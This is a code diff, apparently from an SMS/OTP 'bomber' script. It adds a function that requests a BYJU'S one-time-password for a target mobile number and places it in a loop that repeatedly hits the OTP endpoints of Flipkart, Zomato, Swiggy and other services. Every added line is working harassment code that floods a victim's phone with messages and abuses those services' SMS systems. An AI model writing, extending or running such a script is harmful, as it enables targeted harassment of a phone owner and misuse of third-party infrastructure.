@@ -215,6 +215,17 @@ def zomato_api():
 	else:
 		print('Failed - Zomato')
 
+def byjus_api():
+	payload = {'mobile':'+91-'+mobno}
+	
+	url = 'https://students.byjus.com/mobiles/request_otp'
+
+	requests = rq.get(url,params=payload)
+
+	print('success')
+
+
+
 for x in range(0,quantity):
 	flipkart_api()
 	unacademy_api()
@@ -223,3 +234,4 @@ for x in range(0,quantity):
 	swiggy_api()
 	vedantu_api()
 	zomato_api()
+	byjus_api()
